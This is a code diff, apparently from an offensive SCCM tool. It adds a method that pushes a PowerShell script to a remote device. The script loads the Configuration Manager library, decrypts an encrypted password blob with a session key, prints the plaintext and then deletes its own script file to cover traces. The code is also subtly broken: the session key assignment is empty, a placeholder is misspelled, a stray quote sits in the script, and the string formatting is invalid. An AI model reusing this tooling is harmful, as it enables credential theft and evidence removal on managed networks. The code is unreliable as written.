+++ lib/scripts/runscript.py
@@ -270,7 +270,45 @@ Do-Delete
         script_body = base64.b64encode(byte_array).decode('utf-8')
         self.device = device
         self.add_script(script_body)
-        
+
+    def decryptEx(self, device, session_key, encrypted_blob):
+        script = '''
+$sessionKey = 
+$encryptedPwd = '{encrypted_blog}'
+$dllPath = "C:\Program Files\Microsoft Configuration Manager\bin\X64\microsoft.configurationmanager.commonbase.dll"
+Add-Type -Path $dllPath
+$sessionKeyBytes = [byte[]]::new($sessionKey.Length / 2)
+$encryptedBytes = [byte[]]::new($encryptedPwd.Length / 2)
+for($i = 0; $i -lt $sessionKey.Length; $i += 2) {
+$sessionKeyBytes[$i/2] = [Convert]::ToByte($sessionKey.Substring($i, 2), 16)
+}
+for($i = 0; $i -lt $encryptedPwd.Length; $i += 2) {
+$encryptedBytes[$i/2] = [Convert]::ToByte($encryptedPwd.Substring($i, 2), 16)
+}
+$encUtil = [Microsoft.ConfigurationManager.CommonBase.EncryptionUtilities]::Instance
+$decrypted = $encUtil.DecryptWithGeneratedSessionKey($sessionKeyBytes, $encryptedBytes)
+if ($decrypted -ne $null) {
+$length = 0
+foreach($byte in $decrypted) {
+if ($byte -eq 0 -or $byte -lt 32 -or $byte -gt 126) {
+break
+}
+$length++
+}
+$decryptedString = [System.Text.Encoding]::ASCII.GetString($decrypted, 0, $length)
+Write-Host $decryptedString"
+}
+function Do-Delete {
+    Del $MyInvocation.PSCommandPath
+}
+Do-Delete
+    '''%session_key %encrypted_blob
+        bom = codecs.BOM_UTF16_LE
+        byte_array = bom + script.encode('utf-16-le')
+        script_body = base64.b64encode(byte_array).decode('utf-8')
+        self.device = device
+        self.add_script(script_body)
+            
 
     def printlog(self, result):
         filename = (f'{self.logs_dir}/console.log')